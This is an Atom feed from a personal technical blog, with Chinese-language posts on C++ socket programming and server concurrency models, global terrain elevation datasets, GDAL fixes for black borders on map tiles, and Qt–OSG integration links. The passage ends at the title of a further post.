<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jack Huang&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://huangwang.github.io/"/>
  <updated>2019-10-26T16:14:24.326Z</updated>
  <id>https://huangwang.github.io/</id>
  
  <author>
    <name>Jack Huang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>C++高性能网络编程</title>
    <link href="https://huangwang.github.io/2019/10/26/CPlusPlus%E9%AB%98%E6%80%A7%E8%83%BD%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <id>https://huangwang.github.io/2019/10/26/CPlusPlus高性能网络编程/</id>
    <published>2019-10-26T03:31:54.000Z</published>
    <updated>2019-10-26T16:14:24.326Z</updated>
    
    <content type="html"><![CDATA[<p>最近需要用C++编写一个网络程序，因此将网络编程的相关知识整理学习一下。</p><h1 id="Socket编程"><a href="#Socket编程" class="headerlink" title="Socket编程"></a>Socket编程</h1><p>Socket 是对 TCP/IP 协议族的一种封装，是应用层与TCP/IP协议族通信的中间软件抽象层。从设计模式的角度看来，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。</p><p>Socket 还可以认为是一种网络间不同计算机上的进程通信的一种方法，利用三元组（ip地址，协议，端口）就可以唯一标识网络中的进程，网络中的进程通信可以利用这个标志与其它进程进行交互。</p><p>Socket 起源于 Unix ，Unix/Linux 基本哲学之一就是“一切皆文件”，都可以用“打开(open) –&gt; 读写(write/read) –&gt; 关闭(close)”模式来进行操作。因此 Socket 也被处理为一种特殊的文件。</p><h2 id="Socket类型"><a href="#Socket类型" class="headerlink" title="Socket类型"></a>Socket类型</h2><p>创建 socket 的时候需要指定 socket 的类型，一般有三种：</p><ul><li>SOCK_STREAM：面向连接的稳定通信，底层是 TCP 协议，我们会一直使用这个。</li><li>SOCK_DGRAM：无连接的通信，底层是 UDP 协议，需要上层的协议来保证可靠性。</li><li>SOCK_RAW：更加灵活的数据控制，能让你指定 IP 头部</li></ul><h2 id="Socket编程接口"><a href="#Socket编程接口" class="headerlink" title="Socket编程接口"></a>Socket编程接口</h2><ul><li>socket()：创建socket</li><li>bind()：绑定socket到本地地址和端口，通常由服务端调用</li><li>listen()：TCP专用，开启监听模式</li><li>accept()：TCP专用，服务器等待客户端连接，一般是阻塞态</li><li>connect()：TCP专用，客户端主动连接服务器</li><li>send()：TCP专用，发送数据</li><li>recv()：TCP专用，接收数据</li><li>sendto()：UDP专用，发送数据到指定的IP地址和端口</li><li>recvfrom()：UDP专用，接收数据，返回数据远端的IP地址和端口</li><li>closesocket()：关闭socket</li></ul><h2 id="Socket通信流程"><a href="#Socket通信流程" class="headerlink" title="Socket通信流程"></a>Socket通信流程</h2><p></p><p align="center">    <img src="images/socket.jpg" width="60%" alt="Socket通信流程"></p><p></p><center>图1 Socket通信流程</center><h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>不同的计算机对数据的存储格式不一样，比如 32 位的整数 0x12345678，可以在内存里从高到低存储为 12-34-56-78 或者从低到高存储为 78-56-34-12。</p><p>但是这对于网络中的数据来说就带来了一个严重的问题，当机器从网络中收到 12-34-56-78 的数据时，它怎么知道这个数据到底是什么意思？</p><p>解决的方案也比较简单，在传输数据之前和接受数据之后，必须调用 htonl/htons 或 ntohl/ntohs 先把数据转换成网络字节序或者把网络字节序转换为机器的字节序。</p><ul><li>TCP 和 UDP 的端口是互不干扰的，也就是说系统可以同时开启 TCP 80 端口和 UDP 80 端口。</li><li>socket 不属于任何一层网络协议，它是对 TCP 层的封装，方便网络编程。</li></ul><h1 id="网络编程模型"><a href="#网络编程模型" class="headerlink" title="网络编程模型"></a>网络编程模型</h1><h2 id="同步阻塞迭代模型"><a href="#同步阻塞迭代模型" class="headerlink" title="同步阻塞迭代模型"></a>同步阻塞迭代模型</h2><p>同步阻塞迭代模型是最简单的一种IO模型，其核心代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bind(srvfd);</span><br><span class="line">listen(srvfd);</span><br><span class="line">for(;;)</span><br><span class="line">&#123;</span><br><span class="line">    clifd = accept(srvfd,...); //开始接受客户端来的连接</span><br><span class="line">    read(clifd,buf,...); //从客户端读取数据</span><br><span class="line">    dosomthingonbuf(buf);</span><br><span class="line">    write(clifd,buf)//发送数据到客户端</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的程序存在如下一些弊端：</p><ol><li>如果没有客户端的连接请求，进程会阻塞在accept系统调用处，程序不能执行其他任何操作。(系统调用使得程序从用户态陷入内核态）</li><li>在与客户端建立好一条链路后，通过read系统调用从客户端接受数据，而客户端合适发送数据过来是不可控的。如果客户端迟迟不发生数据过来，则程序同样会阻塞在read调用，此时，如果另外的客户端来尝试连接时，都会失败。</li><li>同样的道理，write系统调用也会使得程序出现阻塞(例如：客户端接受数据异常缓慢，导致写缓冲区满，数据迟迟发送不出)。</li></ol><h2 id="多进程并发模型"><a href="#多进程并发模型" class="headerlink" title="多进程并发模型"></a>多进程并发模型</h2><p>多进程并发模型在同步阻塞迭代模型的基础上进行了一些改进，以避免是程序阻塞在read系统调用上。核心代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bind(srvfd);</span><br><span class="line">listen(srvfd);</span><br><span class="line">for(;;)&#123;</span><br><span class="line">clifd = accept(srvfd,...); //开始接受客户端来的连接</span><br><span class="line">ret = fork();</span><br><span class="line">switch( ret )</span><br><span class="line">&#123;</span><br><span class="line">    case -1 :</span><br><span class="line">        do_err_handler();</span><br><span class="line">        break;</span><br><span class="line">    case 0: // 子进程</span><br><span class="line">        client_handler(clifd);</span><br><span class="line">        break ;</span><br><span class="line">    default : // 父进程</span><br><span class="line">        close(clifd);</span><br><span class="line">        continue ;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">void client_handler(clifd)</span><br><span class="line">&#123;</span><br><span class="line">    read(clifd,buf,...); //从客户端读取数据</span><br><span class="line">    dosomthingonbuf(buf);</span><br><span class="line">    write(clifd,buf)//发送数据到客户端</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述程序在accept系统调用时，如果没有客户端来建立连接，会阻塞在accept处。一旦某个客户端连接建立起来，则立即开启一个新的进程来处理与这个客户的数据交互。避免程序阻塞在read调用，而影响其他客户端的连接。</p><h2 id="多线程并发模型"><a href="#多线程并发模型" class="headerlink" title="多线程并发模型"></a>多线程并发模型</h2><p>在多进程并发模型中，每一个客户端连接开启fork一个进程，若客户端连接较大，则系统依然将不堪负重。通过多线程(或线程池)并发模型，可以在一定程度上改善这一问题。</p><p>在服务端的线程模型实现方式一般有三种：</p><ul><li>按需生成(来一个连接生成一个线程)</li><li>线程池(预先生成很多线程)</li><li>Leader follower（LF）</li></ul><p>以第一种为例，其核心代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void *thread_callback( void *args ) //线程回调函数</span><br><span class="line">&#123;</span><br><span class="line">    int clifd = *(int *)args ;</span><br><span class="line">    client_handler(clifd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void client_handler(clifd)</span><br><span class="line">&#123;</span><br><span class="line">    read(clifd,buf,...); //从客户端读取数据</span><br><span class="line">    dosomthingonbuf(buf);</span><br><span class="line">    write(clifd,buf)//发送数据到客户端</span><br><span class="line">&#125;</span><br><span class="line">bind(srvfd);</span><br><span class="line">listen(srvfd);</span><br><span class="line">for(;;)</span><br><span class="line">&#123;</span><br><span class="line">    clifd = accept();</span><br><span class="line">    pthread_create(...,thread_callback,&amp;clifd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端分为主线程和工作线程，主线程负责accept()连接，而工作线程负责处理业务逻辑和流的读取等。因此，即使在工作线程阻塞的情况下，也只是阻塞在线程范围内，对继续接受新的客户端连接不会有影响。</p><p>第二种实现方式，通过线程池的引入可以避免频繁的创建、销毁线程，能在很大程序上提升性能。</p><p>但多线程模型先天具有如下缺点：</p><ul><li>稳定性相对较差。一个线程的崩溃会导致整个程序崩溃。</li><li>临界资源的访问控制，在加大程序复杂性的同时，锁机制的引入会是严重降低程序的性能。性能上可能会出现“辛辛苦苦好几年，一夜回到解放前”的情况。</li></ul><h2 id="IO多路复用模型"><a href="#IO多路复用模型" class="headerlink" title="IO多路复用模型"></a>IO多路复用模型</h2><p>多进程模型和多线程(线程池)模型每个进程/线程只能处理一路IO，在服务器并发数较高的情况下，过多的进程/线程会使得服务器性能下降。而通过多路IO复用，能使得一个进程同时处理多路IO，提升服务器吞吐量。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.csdn.net/u010913001/article/details/52487938" target="_blank" rel="noopener">C++网络框架和库</a>,by 帝王铠.</li><li><a href="https://juejin.im/post/59e47ce36fb9a0451f2ffee8" target="_blank" rel="noopener">C++ 高性能服务器网络框架设计细节</a>,by 范蠡.</li><li><a href="https://www.jianshu.com/p/ee5b34870eba" target="_blank" rel="noopener">值得推荐的C/C++框架和库 (真的很强大)</a>,by tibet889.</li><li><a href="https://zhuanlan.zhihu.com/p/71707672" target="_blank" rel="noopener">有哪些值得推荐的c/c++开源框架与库</a>,by 零声学院.</li><li><a href="https://www.zhihu.com/question/20124494" target="_blank" rel="noopener">有什么适合提高 C/C++ 网络编程能力的开源项目推荐？</a>,by zhihu.</li><li><a href="https://blog.csdn.net/lijinqi1987/article/details/71214974" target="_blank" rel="noopener">网络库libevent、libev、libuv对比</a>,by 小麒麟666.</li><li><a href="https://blog.csdn.net/tjm1017/article/details/88219576" target="_blank" rel="noopener">libevent、libev、libuv、IOCP、asio、muduo优劣分析、QT下编译libevent静态库</a>,by 雒珣.</li><li><a href="https://lotabout.me/2018/reactor-pattern/" target="_blank" rel="noopener">Reactor 模式简介</a>,by lotabou.</li><li><a href="https://segmentfault.com/a/1190000002715832" target="_blank" rel="noopener">IO设计模式：Reactor和Proactor对比</a>,by 大CC.</li><li><a href="https://www.jianshu.com/p/96c0b04941e2" target="_blank" rel="noopener">Proactor和Reactor模型</a>,by wiseAaron.</li><li><a href="https://www.zhihu.com/question/26943938" target="_blank" rel="noopener">如何深刻理解reactor和proactor？</a>,by zhihu.</li><li><a href="http://senlinzhan.github.io/2017/08/12/libevent/" target="_blank" rel="noopener">Libevent 编程指南</a>,by senlin.</li><li><a href="https://zhuanlan.zhihu.com/p/20315482" target="_blank" rel="noopener">网络编程（三）：从libevent到事件通知机制</a>,by auxten.</li><li><a href="https://www.ibm.com/developerworks/cn/aix/library/au-libev/index.html" target="_blank" rel="noopener">使用 libevent 和 libev 提高网络应用性能</a>,by Martin C. Brown.</li><li><a href="https://zhuanlan.zhihu.com/p/50497450" target="_blank" rel="noopener">兄déi，libuv了解一下</a>,by 宋光宇.</li><li><a href="http://blog.tubumu.com/2017/03/11/libuv-analysis-02/" target="_blank" rel="noopener">Libuv 源码分析(2):源码一览</a>,by Tubumu.</li><li><a href="https://www.cnblogs.com/losophy/p/9202815.html" target="_blank" rel="noopener">IO设计模式：Actor、Reactor、Proactor</a>,by _raindrop.</li><li><a href="http://www.thinkingyu.com/articles/Proactor/" target="_blank" rel="noopener">Proactor网络编程模式歪解</a>,by WUYU.</li><li><a href="https://www.s0nnet.com/archives/deep-understanding-of-reactor-design-patterns" target="_blank" rel="noopener">深入理解Reactor模式</a>,by 独木の白帆.</li><li><a href="https://cizixs.com/2015/03/29/basic-socket-programming/" target="_blank" rel="noopener">socket 编程基础知识</a>,by cizixs.</li><li><a href="https://zhuanlan.zhihu.com/p/43933717" target="_blank" rel="noopener">一文读懂高性能网络编程中的I/O模型</a>,by Jack Jiang.</li><li><a href="https://blog.csdn.net/drdairen/article/details/53694550" target="_blank" rel="noopener">几种典型的服务器网络编程模型归纳(select poll epoll)</a>,by DrStream.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近需要用C++编写一个网络程序，因此将网络编程的相关知识整理学习一下。&lt;/p&gt;
&lt;h1 id=&quot;Socket编程&quot;&gt;&lt;a href=&quot;#Socket编程&quot; class=&quot;headerlink&quot; title=&quot;Socket编程&quot;&gt;&lt;/a&gt;Socket编程&lt;/h1&gt;&lt;p&gt;So
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="C/C++" scheme="https://huangwang.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>地形数据格式总结</title>
    <link href="https://huangwang.github.io/2019/10/20/%E5%9C%B0%E5%BD%A2%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://huangwang.github.io/2019/10/20/地形数据格式总结/</id>
    <published>2019-10-20T11:42:06.000Z</published>
    <updated>2019-10-21T04:58:33.259Z</updated>
    
    <content type="html"><![CDATA[<p>地形数据是能够表示地球表面高低起伏状态的数据，即具有高程信息的数据。数字高程模型（DEM）是一种对空间起伏变化的连续表示方法，是一种特殊的 DatasetGrid 数据模型，每个网格的值为高程值，而且有标准的颜色表来表示，这对分幅 DEM 图像的合成很有帮助。</p><p>数字地面模型（digital terrain model，DTM）就是以数字的形式来表示实际地形特征的空间分布。有时所指的地形特征点仅指地面点的高程，就将这种数字地形描述称为数字高程模型（digital elevation model，DEM）。最初是于1958年由美国麻省理工学院Miller教授提出。数字地面模型广泛用于遥感，地理信息系统，大地测量和电子地图等领域。</p><p><strong>常用的地形数据主要有：etopo、GTOPO30、GEBCO以及SRTM。按照精度从低到高排序如下：</strong></p><ul><li>etopo5：GMT 网格数据之 etopo5</li><li>etopo2：GMT 网格数据之 ETOPO2v2</li><li>etopo1：GMT 网格数据之 ETOPO1</li><li>GEBCO：GEBCO：全球水深数据</li><li>GTOPO30：GMT 网格数据之 GTOPO30</li><li>SRTM30_PLUS：全球地形起伏数据：SRTM30_PLUS</li><li>SRTM15_PLUS：全球地形起伏数据：SRTM15_PLUS</li><li>SRTM3：高精度地形网格数据 SRTM</li><li>ASTER GDEM：全球数字高程数据：ASTER GDEM</li></ul><div class="table-container"><table><thead><tr><th>数据源</th><th>空间分辨率</th><th>覆盖范围</th><th>陆地/海洋</th></tr></thead><tbody><tr><td>etopo5</td><td>5 弧分</td><td>全球</td><td>陆地 + 海洋</td></tr><tr><td>etopo2</td><td>2 弧分</td><td>全球</td><td>陆地 + 海洋</td></tr><tr><td>etopo1</td><td>1 弧分</td><td>全球</td><td>陆地 + 海洋</td></tr><tr><td>GEBCO</td><td>1 弧分 / 30 弧秒</td><td>全球</td><td>陆地 + 海洋</td></tr><tr><td>GTOPO30</td><td>30 弧秒</td><td>全球</td><td>陆地</td></tr><tr><td>SRTM30_PLUS</td><td>30 弧秒 (约 1km)</td><td>纬度 [-81,81]</td><td>陆地 + 海洋</td></tr><tr><td>SRTM15_PLUS</td><td>15 弧秒 (约 500m)</td><td>纬度 [-81,81]</td><td>陆地 + 海洋</td></tr><tr><td>SRTM</td><td>3 弧秒 (约 90m)</td><td>纬度 [-60,60]</td><td>陆地</td></tr><tr><td>ASTER GDEM</td><td>1 弧秒 (约 30m)</td><td>纬度 [-83,83]</td><td>陆地</td></tr></tbody></table></div><h1 id="ETOPO"><a href="#ETOPO" class="headerlink" title="ETOPO"></a>ETOPO</h1><p>ETOPO是一种地形高程数据。该数据由NGDC美国地球物理中心发布（U.S. National Geophysical Data Center ）。与srtm、aster gdem一样，均为高程数据，所不同的是它还包括海洋海底地形数据。</p><p>ETOPO地形数据有五种规格， ETOPO1的效果最好，ETOPO2、ETOPO5数据尽管可以使用，但目前已不推荐采用。其中ETOPO1约三百多兆的压缩包， ETOPO2约九十兆。</p><h2 id="ETOPO1"><a href="#ETOPO1" class="headerlink" title="ETOPO1"></a>ETOPO1</h2><p>ETOPO1包含了全球地形和海洋深度，采样间隔为1弧分，是目前精度最高的global relief数据；其分为两个版本，Ice Surface和Bedrock，两个版本基本一致。不同之处在于在处理南极洲和Greenland地形时，前者给出的是加上冰盖层之后的高程，后者给出的是岩床的高程。</p><p>对于每个版本又细分为 grid-registered和cell-registered，其中grid-registered是权威版本，cell-registered是衍生版本，因而推荐下载使用grid-registered版本。</p><h1 id="GEBCO"><a href="#GEBCO" class="headerlink" title="GEBCO"></a>GEBCO</h1><p>GEBCO数据的全称是General Bathymetric Chart of the Oceans( 全球海洋通用水深数据) ，是由国际海道测量组织(IHO) 和政府间海洋学委员会(IOC) 联合发布的最全面的世界大洋海底地形数据，也是当今海洋模式中最常用的海洋水深数据之一。</p><h1 id="SRTM"><a href="#SRTM" class="headerlink" title="SRTM"></a>SRTM</h1><p>SRTM 即航天飞机雷达地形测绘使命。航天地形测绘是指以人造地球卫星、宇宙飞船、航天飞机等航天器为工作平台，对地球表面所进行的遥感测量。以往的航天测绘由于其精度有限，一般只能制作中、小比例尺地图。SRTM则是美国太空总署（NASA）和国防部国家测绘局（NIMA）以及德国与意大利航天机构共同合作完成联合测量,由美国发射的“奋进”号航天飞机上搭载SRTM系统完成。本次测图任务从2000年2月11日开始至22日结束，共进行了11天总计222小时23分钟的数据采集工作，获取北纬60度至南纬56度之间总面积超过1.19亿平方公里的雷达影像数据，覆盖地球80%以上的陆地表面。</p><p>SRTM系统获取的雷达影像的数据量约9.8万亿字节，经过两年多的数据处理，制成了数字地形高程模型（DEM）。SRTM产品2003年开始公开发布，经历多修订，目前最新的版本为V4.1版本。</p><p>SRTM地形数据主要包含两类数据：SRTM3和SRTM1。</p><ul><li>SRTM3精度为3弧秒，即90m一个点，包括非洲、北美、南美、欧亚、澳大利亚以及部分岛屿；</li><li>SRTM1精度为1弧秒，即30m一个点，仅限美国地区；</li></ul><p>所有的数据被分为1度<em>1度的单元，共计上万个数据文件。文件名代表了该单元左下角的位置；不同网站下载的数据文件名不同，但文件名类似N37W105的 数据文件，其单元左下角的坐标为(37N,105W)；每个SRTM3数据文件包含了1201</em>1201个采样点；高程数据单位为m，参考水准面为 WGS84大地水准面模型；网格划分采用gridline registration方式，因而单元的南北边及左右边与相邻单元的边重合。</p><h2 id="全国DEM-1km、500m和250m数据（SRTM-90m）"><a href="#全国DEM-1km、500m和250m数据（SRTM-90m）" class="headerlink" title="全国DEM 1km、500m和250m数据（SRTM 90m）"></a>全国DEM 1km、500m和250m数据（SRTM 90m）</h2><p>中国海拔高度（DEM）空间分布数据来源于美国奋进号航天飞机的雷达地形测绘SRTM（Shuttle Radar Topography Mission，SRTM）数据。SRTM数据有现实性强、免费获取等优点，全球许多应用研究都采用SRTM数据开展环境分析。该数据集为基于最新的SRTM V4.1数据经重采样生成，包括1km、500m和250m三种精度的全国一张图数据。数据采用WGS84椭球投影。</p><h2 id="hgt转tiff"><a href="#hgt转tiff" class="headerlink" title="hgt转tiff"></a>hgt转tiff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdal_translate -of GTiff N40E120.hgt N40E120.tif</span><br></pre></td></tr></table></figure><h1 id="ASTER-GDEM"><a href="#ASTER-GDEM" class="headerlink" title="ASTER GDEM"></a>ASTER GDEM</h1><p>ASTER GDEM，即先进星载热发射和反射辐射仪全球数字高程模型，与SRTM一样为数字高程DEM，其全球空间分辨率为30米。该数据是根据 NASA的新一代对地观测卫星Terra的详尽观测结果制作完成的。其数据覆盖范围为北纬83°到南纬83°之间的所有陆地区域，达到了地球陆地表面的99%。号称是“迄今最完整的全球地形数据”。</p><p>ASTER GDEM：空间分辨率：1弧度秒 （约30 米），精度：垂直精度20米，水平精度30米，SRTM数据的纬度覆盖范围是[-60,60]，ASTER GDEM数据的纬度覆盖范围为[-83,83]；SRTM的空间分辨率一般为90m，只有美国境内存在空间分辨率为30m的数据；ASTER GDEM的空间分辨率为30m；</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.resdc.cn/data.aspx?DATAID=123" target="_blank" rel="noopener">全国DEM 1km、500m和250m数据（SRTM 90m）</a>,by 资源环境数据云平台.</li><li><a href="https://en.wikipedia.org/wiki/Digital_elevation_model" target="_blank" rel="noopener">Digital_elevation_model</a>,by wikipedia.</li><li><a href="http://blog.sciencenet.cn/blog-2637373-974284.html" target="_blank" rel="noopener">GMT地形数据</a>,by YF2015.</li><li><a href="https://blog.seisman.info/global-relief-models/" target="_blank" rel="noopener">全球地形起伏数据总结</a>,by SeisMan.</li><li><a href="https://huangwang.github.io/2018/06/13/Cesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Cesium卫星地图和高程数据切片经验总结</a>,by jackhuang.</li><li><a href="https://blog.seisman.info/srtm/" target="_blank" rel="noopener">高精度地形网格数据 SRTM</a>,by seisman.</li><li><a href="https://blog.csdn.net/qq_36377037/article/details/86300330" target="_blank" rel="noopener">工具gdal2srtmtiles的安装使用</a>,by 四域公子.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;地形数据是能够表示地球表面高低起伏状态的数据，即具有高程信息的数据。数字高程模型（DEM）是一种对空间起伏变化的连续表示方法，是一种特殊的 DatasetGrid 数据模型，每个网格的值为高程值，而且有标准的颜色表来表示，这对分幅 DEM 图像的合成很有帮助。&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="Cesium" scheme="https://huangwang.github.io/tags/Cesium/"/>
    
  </entry>
  
  <entry>
    <title>GDAL处理地图栅格Tif黑边的方法</title>
    <link href="https://huangwang.github.io/2019/10/20/GDAL%E5%A4%84%E7%90%86%E5%9C%B0%E5%9B%BE%E6%A0%85%E6%A0%BCTif%E9%BB%91%E8%BE%B9%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://huangwang.github.io/2019/10/20/GDAL处理地图栅格Tif黑边的方法/</id>
    <published>2019-10-20T01:32:28.000Z</published>
    <updated>2019-10-20T04:34:43.296Z</updated>
    
    <content type="html"><![CDATA[<p>通过地图下载软件LocaSpaceViewer下载卫星影像拼接成Tif文件后，会出现黑边问题。此外在Cesium中浏览瓦片地图会出现蓝色区域。下面即分析这两个问题出现的原因和解决方法。</p><h1 id="下载方法"><a href="#下载方法" class="headerlink" title="下载方法"></a>下载方法</h1><p>LocaSpaceViewer中可选择行政区域下载卫星影像，这种方式拼接后的tif文件必然会出现黑边，如图1所示。</p><p></p><p align="center">    <img src="images/black1.jpg" width="60%" alt="黑边问题1"></p><p></p><center>图1 黑边问题1</center><p>推荐在LocaSpaceViewer中以瓦片矩形区域下载卫星影像。具体方法为：</p><ol><li>在该链接<a href="https://www.maptiler.com/google-maps-coordinates-tile-bounds-projection/" target="_blank" rel="noopener">google-maps-coordinates-tile-bounds-projection</a>处查询瓦片的经纬度。</li><li>在LocaSpaceViewer中绘制矩形，并将矩形顶点的经纬度设置为待下载瓦片的经纬度。</li><li>在LocaSpaceViewer下载指定瓦片。</li></ol><p>该方法也可能会出现黑边，如图2所示。</p><p></p><p align="center">    <img src="images/black2.jpg" width="60%" alt="黑边问题2"></p><p></p><center>图1 黑边问题2</center><p>此外，将tif文件转换成标准瓦片后，在Cesium中浏览瓦片地图会出现蓝色区域，如图3所示。</p><p></p><p align="center">    <img src="images/blue.jpg" width="90%" alt="蓝边问题"></p><p></p><center>图3 蓝边问题</center><h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>对问题1，下载不规则边界的地图时，地图下载软件不会自动填充白色或变成透明，所以导致黑边问题1的产生。</p><p>对问题2，产生原因目前不清楚，但因黑边的产生很有规则，所以解决方法会比较简单。</p><p>对问题3，产生原因是蓝边对应的瓦片不存在。</p><h1 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h1><p>对问题1，可采用链接<a href="http://blog.locaspace.cn:81/?p=971" target="_blank" rel="noopener">用LSV下载的高清地图去黑边教程</a>指明的方法去除黑边，但使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdal2tiles.py &lt;image&gt; &lt;tilesdir&gt;</span><br></pre></td></tr></table></figure><p>生成瓦片时会报错，因此建议采用瓦片矩形区域下载卫星影像，不要下载行政区域卫星地图。</p><p>对问题2，使用如下命令去除黑边：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 查看tif文件元数据信息</span><br><span class="line">gdalinfo 10.tif</span><br><span class="line">// 根据黑边位置使用如下命令去除</span><br><span class="line">gdal_translate -srcwin 0 0 4096 4096 10.tif test.tif</span><br></pre></td></tr></table></figure><p>对问题3，使用LocaSpaceViewer下载指定级别指定区域的卫星影像即可。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://huangwang.github.io/2018/06/13/Cesium%E5%8D%AB%E6%98%9F%E5%9C%B0%E5%9B%BE%E5%92%8C%E9%AB%98%E7%A8%8B%E6%95%B0%E6%8D%AE%E5%88%87%E7%89%87%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">Cesium卫星地图和高程数据切片经验总结</a>,by jackhuang.</li><li><a href="http://blog.locaspace.cn:81/?p=971" target="_blank" rel="noopener">用LSV下载的高清地图去黑边教程</a>,by LocaSpaceViewer.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;通过地图下载软件LocaSpaceViewer下载卫星影像拼接成Tif文件后，会出现黑边问题。此外在Cesium中浏览瓦片地图会出现蓝色区域。下面即分析这两个问题出现的原因和解决方法。&lt;/p&gt;
&lt;h1 id=&quot;下载方法&quot;&gt;&lt;a href=&quot;#下载方法&quot; class=&quot;hea
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="Cesium" scheme="https://huangwang.github.io/tags/Cesium/"/>
    
  </entry>
  
  <entry>
    <title>Qt集成OSG开发</title>
    <link href="https://huangwang.github.io/2019/10/13/Qt%E9%9B%86%E6%88%90OSG%E5%BC%80%E5%8F%91/"/>
    <id>https://huangwang.github.io/2019/10/13/Qt集成OSG开发/</id>
    <published>2019-10-13T14:07:38.000Z</published>
    <updated>2019-10-13T14:33:52.480Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.w3xue.com/exp/article/20196/40679.html" target="_blank" rel="noopener">OSG嵌入QT的简明总结</a>,by charlee44.</li><li><a href="https://blog.csdn.net/niu2212035673/article/details/72802055" target="_blank" rel="noopener">OSG和Qt结合</a>,by 先锋小牛.</li><li><a href="https://blog.csdn.net/xpg4321/article/details/72867596" target="_blank" rel="noopener">OSG中使用Qt做界面</a>,by 很菜但努力.</li><li><a href="https://blog.csdn.net/u013207966/article/details/51531023" target="_blank" rel="noopener">第1课时《Qt osgEarth 编程入门》</a>,by 汀兰左岸.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.w3xue.com/exp/article/20196/40679.h
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="飞行仿真" scheme="https://huangwang.github.io/tags/%E9%A3%9E%E8%A1%8C%E4%BB%BF%E7%9C%9F/"/>
    
      <category term="计算机仿真" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BB%BF%E7%9C%9F/"/>
    
  </entry>
  
  <entry>
    <title>SQLServer2008中日期类型数据的存储</title>
